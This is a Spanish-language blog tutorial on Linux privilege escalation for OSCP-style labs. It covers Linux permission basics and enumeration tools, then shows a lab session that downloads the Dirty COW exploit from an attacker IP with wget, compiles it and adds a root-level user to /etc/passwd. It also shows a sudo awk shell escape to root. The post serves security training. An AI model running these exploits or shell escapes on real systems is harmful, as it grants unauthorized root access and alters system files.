---
layout: single
title:  Escalada de Privilegios en Linux
excerpt: "En este post se presentará distintas maneras de poder conseguir el usuario administrador(root) del sistema partiendo de un usuario con pocos privilegios"
date: 2021-07-19
classes: wide
header:
    teaser: /assets/images/que-es-un-socket-y-como-funciona/portada.png
    teaser_home_page: true
categories:
    - Explicaciones
tags:
    - Linux
    - OSCP
---

El objetivo final con la escalada de privilegios en Linux es obtener un shell ejecutándose como usuario root.  
La escalada de privilegios puede ser simple (por ejemplo, un exploit de kernel) o requerir mucho reconocimiento sobre el sistema comprometido.  
En muchos casos, la escalada de privilegios puede no depender simplemente de una mala configuración, pero puede requerir que piense y combine múltiples configuraciones erróneas.   

### Usuarios
• Las cuentas de usuario se configuran en el archivo /etc/passwd.  
• Los hash de contraseña de usuario se almacenan en el archivo /etc/shadow.  
• Los usuarios se identifican mediante un ID de usuario entero (UID).  
• La cuenta de usuario "root" es un tipo especial de cuenta en Linux, tiene un UID de 0 y el sistema otorga a este usuario acceso a cada archivo.  

### Grupos
• Los grupos se configuran en el archivo /etc/group.    
• Los usuarios tienen un grupo principal y pueden tener varios grupos secundarios (o complementarios).  
• De forma predeterminada, el grupo principal de un usuario tiene el mismo nombre como su cuenta de usuario.  

### Archivos y directorios
• Todos los archivos y directorios tienen un solo propietario y un grupo.    
• Los permisos se definen en términos de lectura, escritura y ejecución.  
• Hay tres conjuntos de permisos, uno para el propietario, otro para el grupo, y uno para todos los "otros" usuarios.  
• Solo el propietario puede cambiar los permisos.

### Permisos de archivos
• Leer: se puede leer el contenido del archivo.  
• Escritura: el contenido del archivo se puede modificar.  
• Ejecutar: el archivo se puede ejecutar (es decir, ejecutar como algún tipo de proceso).  

### Herramientas que automatizan la enumeracion
[- LinPeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS "LinPeas")  
[- LinEnum](https://github.com/rebootuser/LinEnum "LinEnum")  
[- LinuxPrivChecker](https://github.com/linted/linuxprivchecker "LinuxPrivChecker")  

--------
--------


## Exploits de kernel
Verificar la version del kernel
```bash
$ uname -a
Linux parrot 5.7.0-2parrot2-amd64 #1 SMP Debian 5.7.10-1parrot2 (2020-07-31) x86_64 GNU/Linux
$ cat /proc/version
Linux version 5.7.0-2parrot2-amd64 (team@parrotsec.org) (gcc version 9.3.0 (Debian 9.3.0-15), GNU ld (GNU Binutils for Debian) 2.34.90.20200706) #1 SMP Debian 5.7.10-1parrot2 (2020-07-31)
```
#### Recursos:
• [LinuxPrivChecker](https://github.com/linted/linuxprivchecker)  
• Searchsploit "linux kernel"  
• [LinuxExploitSuggester2](https://github.com/jondonas/linux-exploit-suggester-2)  

#### Maquinas para practicar:
[- Linux PrivEsc (TryHackMe)](https://tryhackme.com/room/linuxprivesc)   
[- 0day (TryHackMe)](https://tryhackme.com/room/0day)  
- Cybersploit (VulnHub)
- Loly (VulnHub)
- BTRSys 2.1 (VulnHub)

### Ejemplo:  
```bash
user@debian:~$ cat /proc/version                                                                                                                  
Linux version 2.6.32-5-amd64 (Debian 2.6.32-48squeeze6) (jmm@debian.org) (gcc version 4.3.5 (Debian 4.3.5-4) ) #1 SMP Tue May 13 16:34:35 UTC 2014
user@debian:~$ perl linux-exploit-suggester-2.pl                                        
                                                                                        
  #############################                                                         
    Linux Exploit Suggester 2  
  #############################      
                                                                                        
  Local Kernel: 2.6.32                                                                  
  Searching 72 exploits...                                                              
                                                                                        
  Possible Exploits                                                                     
  [1] american-sign-language                                                            
      CVE-2010-4347                                                                     
      Source: http://www.securityfocus.com/bid/45408                                    
  [2] can_bcm                                                                           
      CVE-2010-2959                                                                     
      Source: http://www.exploit-db.com/exploits/14814                                  
  [3] dirty_cow                                                                         
      CVE-2016-5195                                                                     
      Source: http://www.exploit-db.com/exploits/40616                                  
  [4] exploit_x                                                                         
      CVE-2018-14665                                                                    
      Source: http://www.exploit-db.com/exploits/45697                                  
  [5] half_nelson1                                                 
      Alt: econet       CVE-2010-3848                                                   
      Source: http://www.exploit-db.com/exploits/17787                                  
  [6] half_nelson2                                                 
      Alt: econet       CVE-2010-3850                                                   
      Source: http://www.exploit-db.com/exploits/17787                                  
  [7] half_nelson3                                                 
      Alt: econet       CVE-2010-4073                              
      Source: http://www.exploit-db.com/exploits/17787                                  
  [8] msr                                                          
      CVE-2013-0268                                                
      Source: http://www.exploit-db.com/exploits/27297                                  
  [9] pktcdvd                                                      
      CVE-2010-3437                                                
      Source: http://www.exploit-db.com/exploits/15150                                  
  [10] ptrace_kmod2                                                
      Alt: ia32syscall,robert_you_suck       CVE-2010-3301                              
      Source: http://www.exploit-db.com/exploits/15023                                  
  [11] rawmodePTY                                                  
      CVE-2014-0196                                                
      Source: http://packetstormsecurity.com/files/download/126603/cve-2014-0196-md.c   
  [12] rds                                                         
      CVE-2010-3904                                                
      Source: http://www.exploit-db.com/exploits/15285                                  
  [13] reiserfs                                                    
      CVE-2010-1146                                                
      Source: http://www.exploit-db.com/exploits/12130                                  
  [14] video4linux                                                 
      CVE-2010-3081                                                
      Source: http://www.exploit-db.com/exploits/15024    
      

user@debian:~$ wget http://10.9.102.237:8000/dirty.c                                                                                                                  
--2021-07-20 16:34:58--  http://10.9.102.237:8000/dirty.c                        
Connecting to 10.9.102.237:8000... connected.                                        
HTTP request sent, awaiting response... 200 OK                            
Length: 5006 (4.9K) [text/plain]                                                                                                                                                                 
Saving to: “dirty.c”                                                                                                                                                                             
100%[==================================================================================================================================================>] 5,006       --.-K/s   in 0.002s        

2021-07-20 16:34:59 (2.58 MB/s) - “dirty.c” saved [5006/5006]                                                                                                                     
user@debian:~$ cat dirty.c |grep "gcc"                                                                                                                                           
//   gcc -pthread dirty.c -o dirty -lcrypt                                                                                                                             
user@debian:~$ gcc -pthread dirty.c -o dirty -lcrypt                                                                                                                             
user@debian:~$ ls                                                  
dirty  dirty.c  linux-exploit-suggester-2.pl  myvpn.ovpn  tools                                                                       
user@debian:~$ ./dirty                                             
/etc/passwd successfully backed up to /tmp/passwd.bak                                                                                 
Please enter the new password:                                     
Complete line:                                                     
firefart:fiigc/T49TCJk:0:0:pwned:/root:/bin/bash                                                                                      

mmap: 7f15662f0000                                                 

ptrace 0                                                           
Done! Check /etc/passwd to see if the new user was created.                                                                           
You can log in with the username 'firefart' and the password 'pass123'.                                                               

DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd                                                                             
Done! Check /etc/passwd to see if the new user was created.                                                                           
You can log in with the username 'firefart' and the password 'pass123'.                                                               
DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd                                                                             

user@debian:~$ cat /etc/passwd                                     
firefart:fiigc/T49TCJk:0:0:pwned:/root:/bin/bash                          
/sbin:/bin/sh                                                      
bin:x:2:2:bin:/bin:/bin/sh                                         
sys:x:3:3:sys:/dev:/bin/sh                                                
sync:x:4:65534:sync:/bin:/bin/sync                                        
games:x:5:60:games:/usr/games:/bin/sh                              
man:x:6:12:man:/var/cache/man:/bin/sh                              
lp:x:7:7:lp:/var/spool/lpd:/bin/sh                                        
mail:x:8:8:mail:/var/mail:/bin/sh                                  
news:x:9:9:news:/var/spool/news:/bin/sh                            
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh                          
proxy:x:13:13:proxy:/bin:/bin/sh                                   
www-data:x:33:33:www-data:/var/www:/bin/sh                                
backup:x:34:34:backup:/var/backups:/bin/sh                                
list:x:38:38:Mailing List Manager:/var/list:/bin/sh                       
irc:x:39:39:ircd:/var/run/ircd:/bin/sh                             
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh   
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh                          
libuuid:x:100:101::/var/lib/libuuid:/bin/sh                        
Debian-exim:x:101:103::/var/spool/exim4:/bin/false                        
sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin                         
user:x:1000:1000:user,,,:/home/user:/bin/bash                      
statd:x:103:65534::/var/lib/nfs:/bin/false                         
mysql:x:104:106:MySQL Server,,,:/var/lib/mysql:/bin/false                 
user@debian:~$ su firefart                                         
Password:                                                          
firefart@debian:/home/user# id                                     
uid=0(firefart) gid=0(root) groups=0(root)                         

```
----
----
## Sudo (Secuencias de escape shell)
#### Recursos:  
[- gtfobins](https://gtfobins.github.io/ "gtfobins.github.io")   

### Ejemplo
```bash
user@debian:~$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more

user@debian:~$ sudo awk 'BEGIN {system("/bin/sh")}'
sh-4.1# id
uid=0(root) gid=0(root) groups=0(root)

user@debian:~$ sudo iftop
interface: eth0
IP address is: 10.10.117.147
MAC address is: 02:fe:2b:4b:63:f1
root@debian:/home/user# id
uid=0(root) gid=0(root) groups=0(root)



```




